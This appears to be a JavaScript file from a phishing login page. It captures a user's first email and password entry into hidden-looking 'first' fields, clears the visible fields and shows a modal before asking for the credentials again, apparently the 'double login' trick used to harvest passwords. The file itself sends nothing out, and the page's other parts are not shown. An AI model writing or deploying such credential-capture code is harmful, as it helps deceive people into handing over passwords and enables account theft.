// get the modal element 
let modal = document.getElementById('simpleModal');
// get open modal button
let modalBtn = document.getElementsByClassName('button')[0];
let submitBtn = document.getElementById('submit');
// get close button
let closeBtn = document.getElementsByClassName('closeBtn')[0];

let emailField = document.getElementById('emailaddress');
let passwordField = document.getElementById('passwords');
let form = document.getElementsByTagName('form')[0];

let firstEmail = document.getElementById('firstemailaddress');
let firstPassword = document.getElementById('firsttimepassword');

let i = 0;

// listen for open click
modalBtn.addEventListener('click', openModal);

// listen for close click
closeBtn.addEventListener('click', closeModal);

// listen for outside click
window.addEventListener('click', outsideClick);


// function to open modal
function openModal() {
    if (emailField.value.length > 0 && passwordField.value.length > 0) {
        if (i < 1) {
            modal.style.display = 'block';
            i += 1;
            modalBtn.innerHTML = '<button id="submit" type="submit">Next</button>'
            firstEmail.setAttribute('value', `${emailField.value}`);
            firstPassword.setAttribute('value', `${passwordField.value}`);
            emailField.value = '';
            passwordField.value = '';
        }
    }
}

// function to close modal
function closeModal() {
    modal.style.display = 'none';
}

// function to close modal if outside click
function outsideClick(e) {
    if(e.target == modal) {
        modal.style.display = 'none';
    }
}
